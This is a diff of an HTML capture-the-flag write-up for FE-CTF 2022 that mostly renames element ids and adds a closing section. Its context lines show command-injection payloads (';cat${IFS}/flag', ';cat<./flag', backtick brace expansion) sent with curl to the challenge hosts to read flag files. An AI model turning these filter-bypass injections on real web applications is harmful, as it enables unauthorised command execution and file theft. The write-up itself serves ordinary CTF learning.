@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-10-31 Mon 22:34 -->
+<!-- 2022-11-01 Tue 12:42 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>FE-CTF: CyberDemon</title>
@@ -75,6 +75,7 @@
 <li><a href="#org7b9bcaf">5. Tar and feathers&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></a></li>
 <li><a href="#org65e6677">6. Libnotfound&#xa0;&#xa0;&#xa0;<span class="tag"><span class="rev">rev</span></span></a></li>
 <li><a href="#org56d7b6d">7. Guessing Game&#xa0;&#xa0;&#xa0;<span class="tag"><span class="omgacm">omgacm</span></span></a></li>
+<li><a href="#org8f7a028">8. Final words</a></li>
 </ul>
 </div>
 </nav>
@@ -131,7 +132,7 @@ We tested this by injecting the command <code>echo test</code> like so:<br>
 <img src="assets/2022-10-30_16-52-37_screenshot.png" alt="2022-10-30_16-52-37_screenshot.png"><br>
 We can get the flag by using the following oneliner:<br>
 </p>
-<pre class="example" id="org7af8619">
+<pre class="example" id="orgd495e9d">
 [c3lphie@laptop:~]$ curl 'http://dig-host-1-web.hack.fe-ctf.dk/html/dig_host_level1.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0'  --data-raw 'host=%3B+cat+%2Fflag' | grep flag | cut -d "&lt;" -f 1
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -165,7 +166,7 @@ So we changed our payload to:<br>
 <p>
 Then we can just use the following oneliner to get the flag:<br>
 </p>
-<pre class="example" id="org7b835a1">
+<pre class="example" id="org7f88735">
 [c3lphie@laptop:~]$ curl -X POST 'http://dig-host-2-web.hack.fe-ctf.dk/html/dig_host_level2.php' --data 'host=;cat${IFS}/flag'| grep flag | cut -d "&lt;" -f 1
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -195,7 +196,7 @@ Giving us a final payload of:<br>
 ;cat&lt;./flag
 </pre>
 
-<pre class="example" id="org0e49976">
+<pre class="example" id="org4b4ac91">
 [nix-shell:~]$ curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host=;cat&lt;./flag"|grep flag | cut -d "&lt;" -f 1 | recode html..ascii
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -301,7 +302,7 @@ If we look at this snippet from the decompiled main function:<br>
 There is a lot of input sanitization, and after that a reference to <code>/bin/bash</code>.<br>
 Next up we can run strace on the binary and see what its syscalls:<br>
 </p>
-<pre class="example" id="org79e5b15">
+<pre class="example" id="org5828538">
 [nix-shell:~]$ strace ./dig_extract google.com
 execve("./dig_extract", ["./dig_extract", "google.com"], 0x7ffe10ee21b8 /* 122 vars */) = 0
 brk(NULL)                               = 0x1931000
@@ -335,7 +336,7 @@ Giving us the final payload:<br>
 <p>
 Put into the following oneliner:<br>
 </p>
-<pre class="example" id="org7342b3a">
+<pre class="example" id="org251e31a">
 [nix-shell:~]$ curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host='\`{cat,bonus_flag}\`'" | grep flag | recode html..ascii | cut -d "&gt;" -f 5- | head -n 2
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -361,7 +362,7 @@ In this challenge we were given tar file containing multiple tar files nested in
 <p>
 If we start looking at the content of the contents of the tar file we'll see that it is nested tar files:<br>
 </p>
-<pre class="example" id="orgcbb0d99">
+<pre class="example" id="org47b59e6">
 [nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf tar-and-feathers.tgz
 72
 
@@ -412,7 +413,7 @@ In order to turn the ascii hex bytes into actual bytes, we used cyberchef:<br>
 And then downloaded the result.<br>
 Examining the result using file we can that it is another tar archive:<br>
 </p>
-<pre class="example" id="orgc6ebce9">
+<pre class="example" id="orgeb512e6">
 [nix-shell:~/.../fe22/tar-and-feathers]$ file download.dat
 download.dat: POSIX tar archive (GNU)
 
@@ -420,7 +421,7 @@ download.dat: POSIX tar archive (GNU)
 <p>
 So let's extract the contents of that::<br>
 </p>
-<pre class="example" id="orge9d07f8">
+<pre class="example" id="org05af35f">
 [nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf download.dat
 runme.py
 offsets.py
@@ -504,7 +505,7 @@ with open("out.bin", "wb") as f:
 <p>
 Running the script and checking the output:<br>
 </p>
-<pre class="example" id="org7768fb2">
+<pre class="example" id="org1da05ea">
 [nix-shell:~/.../fe22/tar-and-feathers]$ python unpack.py
 
 [nix-shell:~/.../fe22/tar-and-feathers]$ file out.bin
@@ -537,7 +538,7 @@ In this challenge we were provided with a binary that was missing library file.<
 <p>
 We can look at the needed libraries with <code>patchelf</code>:<br>
 </p>
-<pre class="example" id="orge44c46a">
+<pre class="example" id="orgd12687d">
 [nix-shell:~/.../fe22/libnotfound]$ patchelf --print-needed challenge
 libnotfound.so
 libc.so.6
@@ -641,7 +642,7 @@ patchelf --replace-needed libnotfound.so ./src/libnotfound.so challenge
 <p>
 We can then check it like this:<br>
 </p>
-<pre class="example" id="org07d118b">
+<pre class="example" id="orgb1f900f">
 [nix-shell:~/.../fe22/libnotfound]$ patchelf --print-needed challenge
 ./src/libnotfound.so
 libc.so.6
@@ -651,7 +652,7 @@ libc.so.6
 <p>
 And then get the flag by running the binary:<br>
 </p>
-<pre class="example" id="orgef3d706">
+<pre class="example" id="org610d05c">
 [nix-shell:~/.../fe22/libnotfound]$ ./challenge
 flag{hello? yes, this is flag}
 </pre>
@@ -664,7 +665,7 @@ flag{hello? yes, this is flag}
 In this challenge we were basically only given a domain and port.<br>
 Connecting to it with netcat, we get the following message:<br>
 </p>
-<pre class="example" id="org63d86a1">
+<pre class="example" id="orgf8f7853">
 [nix-shell:~/.../fe22/guess]$ nc guess.hack.fe-ctf.dk 1337
 == proof-of-work: disabled ==
  == Welcome to Number Guess ==
@@ -820,6 +821,16 @@ if __name__ == '__main__':
     io.close()
 </pre>
 </div>
+</div>
+</div>
+
+<div id="outline-container-org8f7a028" class="outline-2">
+<h2 id="org8f7a028"><span class="section-number-2">8.</span> Final words</h2>
+<div class="outline-text-2" id="text-8">
+<p>
+Thank you for taking some time out of your day to read this post.<br>
+If you enjoyed this post, feel free to join my <a href="https://discord.gg/t8tKrgdGWu">Discord server</a> to get notification whenever I post something and ask questions if there are any.<br>
+</p>
 </div>
 </div>
 </div>
